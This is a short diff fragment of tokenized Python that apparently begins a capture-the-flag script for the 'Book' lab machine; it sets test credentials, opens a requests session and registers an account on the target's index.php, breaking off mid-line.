@@ -1,0 +1,1 @@
+ail = " 0xdf@book.htb " password = " 0xdf " self . user_sess = requests . session () #self.user_sess.proxies = {'http':'http://127.0.0.1:8080'} self . user_sess . get ( f ' { self . base_url } /index.php ' ) self . user_sess . post ( f ' { self . base_url } /index.php ' , data = f " name=0xdf&email= { email } &password= { password }
